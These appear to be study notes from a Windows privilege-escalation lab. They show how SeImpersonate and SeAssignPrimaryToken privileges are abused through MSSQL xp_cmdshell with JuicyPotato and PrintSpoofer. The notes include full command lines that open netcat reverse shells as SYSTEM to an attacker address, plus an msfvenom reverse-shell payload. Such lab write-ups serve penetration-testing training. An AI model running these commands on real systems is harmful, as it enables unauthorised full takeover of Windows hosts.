# SeImpersonate and SeAssignPrimaryToken privilege

**Token**: every process has a token that has information about the account that is running it and it’s store in memory

> **we ask token from `WinLogon` process**

## Exploit **JuicyPotato**

### Debug programs right

```powershell
PS C:\Users\Public> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
**SeImpersonatePrivilege**        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

#### **Connecting with MSSQLClient.py**

```powershell
irix@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL>
```

#### **Enabling xp\_cmdshell**

```powershell
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```

#### **Confirming Access**

```powershell
SQL> xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01
```

#### **Checking Account Privileges**

```powershell
SQL> xp_cmdshell whoami /priv

output                                                                             

--------------------------------------------------------------------------------   
                                                                    
PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

**SeAssignPrimaryTokenPrivilege** Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
**SeImpersonatePrivilege**        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
```

> The command `whoami /priv` confirms that `SeImpersonatePrivilege` is listed. This privilege can be used to impersonate a privileged account such as `NT AUTHORITY\SYSTEM`. **JuicyPotato** can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via **DCOM/NTLM reflection** abuse

#### **Escalating Privileges Using JuicyPotato**

```powershell
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------------   

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
                                                                            
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08

# l -> refer to port (u can use any port)
# p -> program which run with system token
# a -> argument it will be execute
# which demand from cmd open a reverse shell on attacker machine
```

#### **Catching SYSTEM Shell**

```powershell
irix@htb[/htb]$ sudo nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
nt authority\system

C:\Windows\system32>hostname

hostname
WINLPE-SRV01
```

***

## **PrintSpoofer and RoguePotato**

JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, PrintSpoofer and RoguePotato can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access

#### **Escalating Privileges using PrintSpoofer**

```powershell
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       
```

#### **Catching Reverse Shell as SYSTEM**

```powershell
irix@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
nt authority\system
```

***

## JuicyPotato

we will try to take a reverse shell with System privilege

Create a reverse shell

```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.212 lport=1111 > 1.bat

```

execute shell on windows machine

```powershell
# dont forget to open listenr on Attacker box
.\JuicyPotato.exe -l 5337 -p C:\Users\Public\1.bat -t * -clisd "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
```
